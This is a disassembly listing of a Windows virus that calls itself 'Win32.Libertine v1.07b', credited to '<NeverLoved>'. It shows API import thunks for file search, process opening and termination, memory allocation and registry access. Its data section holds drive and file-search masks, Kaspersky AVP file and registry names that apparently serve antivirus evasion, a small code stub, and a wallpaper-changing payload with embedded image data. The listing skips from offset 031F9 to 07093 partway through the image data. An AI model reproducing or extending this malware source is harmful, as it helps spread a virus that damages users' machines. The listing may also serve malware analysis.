				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_GetCommandLineA
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    02039			jmp_GetCommandLineA	proc	near
    02039  FF 25 00046100			jmp	dword ptr GetCommandLineA	;*(46100=0)
				jmp_GetCommandLineA	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_GetCurrentDirectoryA
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    0203F			jmp_GetCurrentDirectoryA	proc	near
    0203F  FF 25 00046104			jmp	dword ptr GetCurrentDirectoryA	;*(46104=0)
				jmp_GetCurrentDirectoryA	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_GetCurrentProcessId
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    02045			jmp_GetCurrentProcessId	proc	near
    02045  FF 25 00046108			jmp	dword ptr GetCurrentProcessId	;*(46108=0)
				jmp_GetCurrentProcessId	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_GetCurrentThreadId
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    0204B			jmp_GetCurrentThreadId	proc	near
    0204B  FF 25 0004610C			jmp	dword ptr GetCurrentThreadId	;*(4610C=0)
				jmp_GetCurrentThreadId	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_GetDriveTypeA
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    02051			jmp_GetDriveTypeA	proc	near
    02051  FF 25 00046110			jmp	dword ptr GetDriveTypeA	;*(46110=0)
				jmp_GetDriveTypeA	endp

							                        ;* No entry point to code
    02057  FF 25 00046114			jmp	dword ptr GetLastError	;*(46114=0)

				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_FindFirstFileA
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    0205D			jmp_FindFirstFileA	proc	near
    0205D  FF 25 00046118			jmp	dword ptr FindFirstFileA	;*(46118=0)
				jmp_FindFirstFileA	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_GetTickCount
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    02063			jmp_GetTickCount	proc	near
    02063  FF 25 0004611C			jmp	dword ptr GetTickCount	;*(4611C=0)
				jmp_GetTickCount	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_GlobalFree
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    02069			jmp_GlobalFree	proc	near
    02069  FF 25 00046120			jmp	dword ptr GlobalFree	;*(46120=0)
				jmp_GlobalFree	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_GlobalLock
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    0206F			jmp_GlobalLock	proc	near
    0206F  FF 25 00046124			jmp	dword ptr GlobalLock	;*(46124=0)
				jmp_GlobalLock	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_LoadLibraryA
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    02075			jmp_LoadLibraryA	proc	near
    02075  FF 25 00046128			jmp	dword ptr LoadLibraryA	;*(46128=0)
				jmp_LoadLibraryA	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_OpenProcess
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    0207B			jmp_OpenProcess	proc	near
    0207B  FF 25 0004612C			jmp	dword ptr OpenProcess	;*(4612C=0)
				jmp_OpenProcess	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_ReadFile
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    02081			jmp_ReadFile	proc	near
    02081  FF 25 00046130			jmp	dword ptr ReadFile	;*(46130=0)
				jmp_ReadFile	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_SetCurrentDirectoryA
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    02087			jmp_SetCurrentDirectoryA	proc	near
    02087  FF 25 00046134			jmp	dword ptr SetCurrentDirectoryA	;*(46134=0)
				jmp_SetCurrentDirectoryA	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_SetErrorMode
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    0208D			jmp_SetErrorMode	proc	near
    0208D  FF 25 00046138			jmp	dword ptr SetErrorMode	;*(46138=0)
				jmp_SetErrorMode	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_SetFilePointer
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    02093			jmp_SetFilePointer	proc	near
    02093  FF 25 0004613C			jmp	dword ptr SetFilePointer	;*(4613C=0)
				jmp_SetFilePointer	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_Sleep
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    02099			jmp_Sleep	proc	near
    02099  FF 25 00046140			jmp	dword ptr Sleep		;*(46140=0)
				jmp_Sleep	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_TerminateProcess
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    0209F			jmp_TerminateProcess	proc	near
    0209F  FF 25 00046144			jmp	dword ptr TerminateProcess	;*(46144=0)
				jmp_TerminateProcess	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_VirtualAlloc
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    020A5			jmp_VirtualAlloc	proc	near
    020A5  FF 25 00046148			jmp	dword ptr VirtualAlloc	;*(46148=0)
				jmp_VirtualAlloc	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_RegQueryValueExA
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    020AB			jmp_RegQueryValueExA	proc	near
    020AB  FF 25 00046150			jmp	dword ptr RegQueryValueExA	;*(46150=0)
				jmp_RegQueryValueExA	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_RegSetValueExA
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    020B1			jmp_RegSetValueExA	proc	near
    020B1  FF 25 00046154			jmp	dword ptr RegSetValueExA	;*(46154=0)
				jmp_RegSetValueExA	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_RegOpenKeyA
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    020B7			jmp_RegOpenKeyA	proc	near
    020B7  FF 25 00046158			jmp	dword ptr RegOpenKeyA	;*(46158=0)
				jmp_RegOpenKeyA	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_RegCloseKey
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    020BD			jmp_RegCloseKey	proc	near
    020BD  FF 25 0004615C			jmp	dword ptr RegCloseKey	;*(4615C=0)
				jmp_RegCloseKey	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_GetWindowThreadProcessId
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    020C3			jmp_GetWindowThreadProcessId	proc	near
    020C3  FF 25 00046164			jmp	dword ptr GetWindowThreadProcessId	;*(46164=0)
				jmp_GetWindowThreadProcessId	endp


				;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
				;                          jmp_FindWindowA
				;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

    020C9			jmp_FindWindowA	proc	near
    020C9  FF 25 00046168			jmp	dword ptr FindWindowA	;*(46168=0)
				jmp_FindWindowA	endp

    020CF  0131[00]				db	305 dup (0)
							                        ; Inter-segment boundary
    02200  0E00[00]				db	3584 dup (0)
							                        ; Inter-segment boundary
    03000  0D 0A 5B 57 69 6E			db	0Dh, 0Ah, '[Win32.Libertine v1.07'
    03006  33 32 2E 4C 69 62
    0300C  65 72 74 69 6E 65
    03012  20 76 31 2E 30 37
    03018  62 5D 0D 0A				db	'b]', 0Dh, 0Ah
    0301C  43 6F 70 79 72 69	copyright	db	'Copyright 1998-xxxx by <NeverLov'
    03022  67 68 74 20 31 39
    03028  39 38 2D 78 78 78
    0302E  78 20 62 79 20 3C
    03034  4E 65 76 65 72 4C
    0303A  6F 76
    0303C  65 64 3E				db	'ed>'
    0303F  0D 0A 4D 79 6C 65			db	0Dh, 0Ah, 'Mylene, I '
    03045  6E 65 2C 20 49 20
    0304B  03					db	3
    0304C  20 55 20 21 0D 0A			db	' U !', 0Dh, 0Ah, 'MZ'
    03052  4D 5A
    03054  0000			data_31		dw	0
    03056  0000			data_32		dw	0
    03058  00 00 00 00 00 23			db	 00h, 00h, 00h, 00h, 00h, 23h
    0305E  FF FF 00 00 40 03			db	0FFh,0FFh, 00h, 00h, 40h, 03h
    03064  00 00 20 01 F0 FF			db	 00h, 00h, 20h, 01h,0F0h,0FFh
    0306A  00 00 00 00				db	0, 0, 0, 0
    0306E  00000000		data_34		dd	00000h
    03072  1E 33 C0 8E D8 66			db	 1Eh, 33h,0C0h, 8Eh,0D8h, 66h
    03078  C7 06 98 01 B0 03			db	0C7h, 06h, 98h, 01h,0B0h, 03h
    0307E  CF 00 66 C7 06 90			db	0CFh, 00h, 66h,0C7h, 06h, 90h
    03084  00 98 01 00 00 1F			db	 00h, 98h, 01h, 00h, 00h, 1Fh
    0308A  66 A1 1C 01 8B F0			db	 66h,0A1h, 1Ch, 01h, 8Bh,0F0h
    03090  83 E6 0F 66 C1 E8			db	 83h,0E6h, 0Fh, 66h,0C1h,0E8h
    03096  04 8C DA 03 C2 83			db	 04h, 8Ch,0DAh, 03h,0C2h, 83h
    0309C  C6 42 50 56 CB			db	0C6h, 42h, 50h, 56h,0CBh
    030A1  5F 4D 79 6C 65 6E			db	'_Mylene_'
    030A7  65 5F
    030A9  B8 7B 00 00				db	0B8h, 7Bh, 00h, 00h
    030AD  00000000		data_35		dd	00000h
    030B1  B8 7B				db	0B8h, 7Bh
    030B3  00 00				db	0, 0
    030B5  00000000		data_37		dd	00000h
    030B9  000C[00]				db	12 dup (0)
    030C5  40 00 00 E0				db	 40h, 00h, 00h,0E0h
    030C9  43			data_38		db	43h
    030CA  3A 5C 00				db	':\', 0
    030CD  2A 2E 2A 00				db	'*.*', 0
    030D1  2E 2E 00				db	'..', 0
    030D4  5C 61 76 70 69 63			db	'\avpichck.dll', 0
    030DA  68 63 6B 2E 64 6C
    030E0  6C 00
    030E2  41 56 50 49 33 32			db	'AVPI32', 0
    030E8  00
    030E9  2E 44 65 66 61 75			db	'.Default\Software\KasperskyLab\A'
    030EF  6C 74 5C 53 6F 66
    030F5  74 77 61 72 65 5C
    030FB  4B 61 73 70 65 72
    03101  73 6B 79 4C 61 62
    03107  5C 41
    03109  56 50 49 00				db	'VPI', 0
    0310D  53 4F 46 54 57 41			db	'SOFTWARE\Microsoft\Shared Tools\'
    03113  52 45 5C 4D 69 63
    03119  72 6F 73 6F 66 74
    0311F  5C 53 68 61 72 65
    03125  64 20 54 6F 6F 6C
    0312B  73 5C
    0312D  47 72 61 70 68 69			db	'Graphics Filters\Import\JPEG', 0
    03133  63 73 20 46 69 6C
    03139  74 65 72 73 5C 49
    0313F  6D 70 6F 72 74 5C
    03145  4A 50 45 47 00
    0314A  50 61 74 68				db	'Path'
    0314E  0009[00]				db	9 dup (0)
    03157  43 3A 5C 4D 79 6C			db	'C:\Mylene.bmp', 0
    0315D  65 6E 65 2E 62 6D
    03163  70 00
    03165  43 6F 6E 74 72 6F			db	'Control Panel\desktop', 0
    0316B  6C 20 50 61 6E 65
    03171  6C 5C 64 65 73 6B
    03177  74 6F 70 00
    0317B  54 69 6C 65 57 61			db	'TileWallpaper', 0
    03181  6C 6C 70 61 70 65
    03187  72 00
    03189  31 00 49 6D 70 6F			dbu	'1ImportGr@16mylene.exe sexy'
    0318F  72 74 47 72 40 31
    03195  36 00 6D 79 6C 65
    0319B  6E 65 2E 65 78 65
    031A1  20 73 65 78 79 00
    031A7  0000012C		data_42		dd	0012Ch
    031AB  2C 01 00 00				db	 2Ch, 01h, 00h, 00h
    031AF  00			data_43		db	0
    031B0  42 4D 26 7D 02 00			db	 42h, 4Dh, 26h, 7Dh, 02h, 00h
    031B6  00 00 00 00 36 00			db	 00h, 00h, 00h, 00h, 36h, 00h
    031BC  00 00 FF D8 FF E0			db	 00h, 00h,0FFh,0D8h,0FFh,0E0h
    031C2  00 10 4A 46 49 46			db	 00h, 10h, 4Ah, 46h, 49h, 46h
    031C8  00 01 01 00 00 01			db	 00h, 01h, 01h, 00h, 00h, 01h
    031CE  00 01 00 00 FF DB			db	 00h, 01h, 00h, 00h,0FFh,0DBh
    031D4  00 84 00 08 06 06			db	 00h, 84h, 00h, 08h, 06h, 06h
    031DA  07 06 05 08 07 07			db	 07h, 06h, 05h, 08h, 07h, 07h
    031E0  07 09 09 08 0A 0C			db	 07h, 09h, 09h, 08h, 0Ah, 0Ch
    031E6  14 0D 0C 0B 0B 0C			db	 14h, 0Dh, 0Ch, 0Bh, 0Bh, 0Ch
    031EC  19 12 13 0F 14 1D			db	 19h, 12h, 13h, 0Fh, 14h, 1Dh
    031F2  1A 1F 1E 1D 1A 1C			db	 1Ah, 1Fh, 1Eh, 1Dh, 1Ah, 1Ch
    031F8  1C					db	 1Ch
    031F9  20 24				db	' $'
    07093  00000000		data_49		dd	00000h
    07097  00000000		data_50		dd	00000h
    0709B  00000000		data_51		dd	00000h
    0709F  00000000		data_52		dd	00000h
    070A3  00000000		data_53		dd	00000h
    070A7  00 00 00 00				db	0, 0, 0, 0
    070AB  00000000		data_55		dd	00000h
    070AF  00			data_56		db	0
    070B0  00000000		data_57		dd	00000h
    070B4  00000000		data_58		dd	00000h
    070B8  00000000		data_59		dd	00000h
    070BC  00			data_60		db	0
    070BD  0000			data_61		dw	0
    070BF  00000000		data_62		dd	00000h
    070C3  00000000		data_63		dd	00000h
    070C7  00			data_64		db	0
    070C8  00			data_65		db	0
    070C9  00			data_66		db	0
    070CA  00000000		data_67		dd	00000h
    070CE  00 00 00 00				db	0, 0, 0, 0
    070D2  00			data_68		db	0
    070D3  00			data_69		db	0
    070D4  0000			data_70		dw	0
    070D6  012A[00]				db	298 dup (0)
							                        ; Inter-segment boundary
    07200  09B8[00]				db	2488 dup (0)
    07BB8  00000000		data_72		dd	00000h
    07BBC  00D3[00]				db	211 dup (0)
    07C8F  00			data_73		db	0
    07C90  00000000		data_74		dd	00000h
    07C94  00000000		data_75		dd	00000h
    07C98  00000000		data_76		dd	00000h
    07C9C  00000000		data_77		dd	00000h
